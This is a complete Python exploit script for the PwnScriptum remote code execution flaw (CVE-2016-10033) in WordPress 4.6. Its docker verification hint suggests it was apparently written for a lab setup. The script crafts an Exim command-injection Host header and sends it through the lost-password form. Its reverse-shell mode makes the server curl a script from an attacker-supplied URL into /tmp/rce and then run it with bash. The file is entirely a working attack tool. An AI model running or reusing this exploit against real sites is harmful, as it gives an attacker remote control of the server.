#!/usr/bin/env python3
"""
WordPress 4.6 PwnScriptum RCE (CVE-2016-10033)
Enhanced client (extends the existing exploit.py with argparse).

Target: WordPress 4.6 with PHPMailer
Port:   8080
"""

import argparse
import sys
import requests

requests.packages.urllib3.disable_warnings()


def check_target(target):
    """Check if WordPress is accessible."""
    try:
        r = requests.get(f"{target}/", timeout=10, verify=False)
        if r.status_code == 200 and "wordpress" in r.text.lower():
            print(f"[+] WordPress detected at {target}")
            return True
        print(f"[*] Target responded (HTTP {r.status_code})")
        return True
    except requests.exceptions.ConnectionError:
        print(f"[-] Could not connect to {target}")
        return False


def generate_host_header(command):
    """Generate the malicious Host header with Exim command injection."""
    command = '${run{%s}}' % command
    command = command.replace('/', '${substr{0}{1}{$spool_directory}}')
    command = command.replace(' ', '${substr{10}{1}{$tod_log}}')
    return 'target(any -froot@localhost -be %s null)' % command


def exploit_download(target, shell_url, username="admin"):
    """
    Step 1: Download a shell script from a URL.
    Uses curl to fetch the payload and save it to /tmp/rce.
    """
    print(f"\n[*] Step 1: Downloading shell from {shell_url}")
    download_cmd = f'/usr/bin/curl -o/tmp/rce {shell_url}'
    host_header = generate_host_header(download_cmd)

    session = requests.Session()
    session.headers = {
        'Host': host_header,
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
    }
    session.allow_redirects = False

    data = {
        'user_login': username,
        'redirect_to': '',
        'wp-submit': 'Get New Password'
    }

    r = session.post(f"{target}/wp-login.php?action=lostpassword",
                    data=data, timeout=15, verify=False)
    print(f"[+] Download request sent (HTTP {r.status_code})")
    return session, data


def exploit_execute(target, session, data, username="admin"):
    """
    Step 2: Execute the downloaded shell script.
    """
    print("[*] Step 2: Executing /bin/bash /tmp/rce")
    exec_cmd = '/bin/bash /tmp/rce'
    host_header = generate_host_header(exec_cmd)

    session.headers['Host'] = host_header
    r = session.post(f"{target}/wp-login.php?action=lostpassword",
                    data=data, timeout=15, verify=False)
    print(f"[+] Execution request sent (HTTP {r.status_code})")


def exploit_touch(target, filepath="/tmp/success", username="admin"):
    """Simple exploit to verify RCE by touching a file."""
    print(f"\n[*] Executing: /bin/touch {filepath}")
    touch_cmd = f'/bin/touch {filepath}'
    host_header = generate_host_header(touch_cmd)

    session = requests.Session()
    session.headers = {
        'Host': host_header,
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
    }
    session.allow_redirects = False

    data = {
        'user_login': username,
        'redirect_to': '',
        'wp-submit': 'Get New Password'
    }

    r = session.post(f"{target}/wp-login.php?action=lostpassword",
                    data=data, timeout=15, verify=False)
    print(f"[+] Request sent (HTTP {r.status_code})")
    print(f"[*] Verify: docker compose exec web ls -la {filepath}")


def main():
    parser = argparse.ArgumentParser(
        description="WordPress 4.6 PwnScriptum RCE (CVE-2016-10033)"
    )
    parser.add_argument("target", help="Target URL (e.g., http://192.168.1.100:8080)")
    parser.add_argument("--mode", choices=["check", "touch", "reverse-shell"],
                        default="check", help="Mode (default: check)")
    parser.add_argument("--shell-url",
                        help="URL to reverse shell script (reverse-shell mode)")
    parser.add_argument("--user", default="admin",
                        help="Existing WordPress username (default: admin)")
    parser.add_argument("--filepath", default="/tmp/success",
                        help="File path to touch (touch mode)")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    print(f"[*] Target: {target}")

    if not check_target(target):
        sys.exit(1)

    if args.mode == "check":
        print("[+] Target accessible. Use --mode touch or --mode reverse-shell")
        print("\n[!] Requirements for this exploit:")
        print("    1. Commands are converted to lowercase")
        print("    2. Must use absolute paths")
        print("    3. No special characters like : ' \"")
        print("    4. Need a valid WordPress username")
    elif args.mode == "touch":
        exploit_touch(target, args.filepath, args.user)
    elif args.mode == "reverse-shell":
        if not args.shell_url:
            print("[-] --shell-url is required for reverse-shell mode")
            print("[*] Create a reverse shell script, host it on a web server,")
            print("    and provide the URL (must be all lowercase, no redirects)")
            sys.exit(1)
        session, data = exploit_download(target, args.shell_url, args.user)
        import time
        time.sleep(2)
        exploit_execute(target, session, data, args.user)


if __name__ == "__main__":
    main()
